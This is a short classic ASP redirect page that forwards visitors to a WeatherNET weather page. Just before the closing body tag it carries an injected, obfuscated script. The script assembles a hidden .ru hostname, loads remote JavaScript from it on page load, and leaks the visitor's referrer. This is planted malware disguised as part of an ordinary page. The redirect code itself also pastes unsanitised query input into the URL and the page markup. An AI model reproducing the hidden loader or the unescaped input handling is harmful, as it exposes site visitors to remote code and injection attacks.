<%
OPTION EXPLICIT

DIM sURL
DIM sSite

sURL = "http://www.aws.com/AWS/wx.asp?ID="

sSite = Request.QueryString("site")
IF 0 = LEN(sSite) THEN
	sSite = Request.Form("site")
END IF

sUrl = sUrl & sSite

Response.Redirect sUrl
%>
<html>

<head>
<meta name="robots" content="noindex">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<noscript>
<meta http-equiv="refresh" content="2; URL=<%=sURL%>">
</noscript>
<script language="JavaScript">
<!--

function doLoad()
{
	replaceWindowURL( self, "<%=sURL%>" );
}

//-->
</script>
<script language="JavaScript">
<!--
function replaceWindowURL( win, url )
{
	win.location.href = url;
}
//-->
</script>
<script language="JavaScript1.1">
<!--
function replaceWindowURL( win, url )
{
	win.location.replace( url );
}
//-->
</script>
</head>

<body onload="doLoad()">

<p><a href="<%=sURL%>">Here is the WeatherNET page requested</a>.</p>

<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>

</html>